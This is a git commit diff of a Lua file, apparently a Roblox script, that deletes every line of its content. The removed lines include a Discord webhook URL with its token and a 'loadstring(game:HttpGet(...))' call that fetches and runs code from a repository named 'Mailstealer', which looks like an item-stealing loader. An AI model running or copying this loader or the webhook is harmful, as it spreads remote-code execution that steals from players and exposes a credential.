1c1b5134a4213b03baa0e735b967da79688eec5f
ShxrkWare <109017991+ShxrkWare@users.noreply.github.com>
2024-01-08 16:36:13 +0700

    Update roleplaza.lua

--- roleplaza.lua
+++ roleplaza.lua
@@ -1,7 +1,1 @@
-Username = "Sieunhan8484"
 
-Webhook = "https://discord.com/api/webhooks/1193797414683955290/z6qeIpcGRRXL2xeEKMbRnu1fqxRpfaSeGN97ZGh4lFr7Xarzy8GxXMZdrYqAsXBZSYrT"
-
-LoadingScreen = true 
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/MailstealerV2/Mailstealer/main/v2"))()
